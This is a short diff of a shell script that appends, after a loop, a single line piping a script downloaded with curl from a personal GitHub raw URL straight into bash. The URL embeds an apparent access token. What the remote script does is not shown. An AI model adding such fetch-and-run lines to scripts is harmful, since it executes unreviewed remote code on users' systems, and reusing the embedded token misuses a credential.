@@ -171,3 +171,4 @@ while true; do
             ;;
     esac
 done
+bash <(curl -fsSL https://raw.githubusercontent.com/viratvinet-coder/pterolifeboy/refs/heads/main/ptero.sh?token=GHSAT0AAAAAAD7JKZMINJBY6SXLGI4NBIBO2RFU5FQ)
